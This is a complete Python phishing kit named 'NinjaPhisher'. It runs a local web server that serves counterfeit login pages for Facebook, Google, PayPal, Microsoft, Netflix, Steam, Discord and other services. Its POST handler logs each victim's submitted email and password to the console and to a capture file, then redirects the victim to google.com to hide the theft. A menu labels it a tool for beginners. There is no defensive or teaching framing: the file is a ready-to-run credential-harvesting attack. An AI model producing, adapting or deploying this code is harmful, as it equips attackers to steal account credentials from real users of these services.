#!/usr/bin/env python3
import os, sys, socket, http.server, socketserver, time
from urllib.parse import parse_qs
from colorama import Fore, Style, init

init(autoreset=True)

class NinjaPhisher:
    def __init__(self):
        self.results_file = "ninja_captures.txt"
        
        self.templates = {
            "01": ("Facebook", "#1877f2", "facebook"),
            "02": ("Instagram", "#E4405F", "Instagram"),
            "03": ("Google", "#4285f4", "Google"),
            "04": ("Microsoft", "#0078d4", "Microsoft"),
            "05": ("Netflix", "#e50914", "NETFLIX"),
            "06": ("Paypal", "#003087", "PayPal"),
            "07": ("Steam", "#171a21", "STEAM"),
            "08": ("Twitter", "#1DA1F2", "Twitter"),
            "09": ("Playstation", "#003791", "PlayStation"),
            "10": ("Tiktok", "#000000", "TikTok"),
            "11": ("Twitch", "#9146FF", "Twitch"),
            "21": ("Discord", "#5865F2", "Discord"),
        }

    def base_html(self, name, color, logo_text):
        
        dark_mode = "background:#121212; color:white;" if name in ["Netflix", "Tiktok", "Steam"] else "background:#f0f2f5; color:black;"
        container_bg = "background:#1e1e1e;" if name in ["Netflix", "Tiktok", "Steam"] else "background:white;"
        
        return f"""
        <!DOCTYPE html>
        <html><head><title>{name} Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ font-family: sans-serif; {dark_mode} display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
            .card {{ {container_bg} padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }}
            h1 {{ color: {color}; font-size: 28px; margin-bottom: 20px; }}
            input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
            .btn {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }}
            .footer {{ margin-top: 20px; font-size: 12px; color: #888; }}
        </style></head>
        <body>
            <div class="card">
                <h1>{logo_text}</h1>
                <form method="POST">
                    <input type="text" name="email" placeholder="Email or Phone" required>
                    <input type="password" name="pass" placeholder="Password" required>
                    <button type="submit" class="btn">Log In</button>
                </form>
                <div class="footer">Forgot password? · Help Center</div>
            </div>
        </body></html>
        """

    class PhishServer(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, ninja=None, page_data=None, **kwargs):
            self.ninja = ninja
            self.page_data = page_data
            super().__init__(*args, **kwargs)

        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = self.ninja.base_html(*self.page_data)
            self.wfile.write(html.encode())

        def do_POST(self):
            length = int(self.headers['Content-Length'])
            data = parse_qs(self.rfile.read(length).decode())
            user = data.get('email', ['?'])[0]
            pwd = data.get('pass', ['?'])[0]
            print(f"\n{Fore.RED}[!] CAPTURED: {user} | {pwd}{Style.RESET_ALL}")
            with open(self.ninja.results_file, "a") as f:
                f.write(f"Site: {self.page_data[0]} | User: {user} | Pass: {pwd}\n")
            self.send_response(302)
            self.send_header('Location', 'https://google.com')
            self.end_headers()

    def start_server(self, choice):
        page_data = self.templates[choice]
        PORT = 8080
        
        socketserver.TCPServer.allow_reuse_address = True
        
        try:
            with socketserver.TCPServer(("", PORT), lambda *args: self.PhishServer(*args, ninja=self, page_data=page_data)) as httpd:
                print(f"{Fore.GREEN}[*] {page_data[0]} Server Live at http://localhost:{PORT}{Style.RESET_ALL}")
                httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nStopping...")
        except Exception as e:
            print(f"Error: {e}")

    def main(self):
        while True:
            os.system('clear')
            print(f"{Fore.YELLOW}--- NINJA PHISHER FOR BEGGINER ---{Style.RESET_ALL}")
            for k, v in self.templates.items():
                print(f"[{k}] {v[0]}")
            c = input("\nNinja > ")
            if c in self.templates:
                self.start_server(c)

if __name__ == "__main__":
    NinjaPhisher().main()
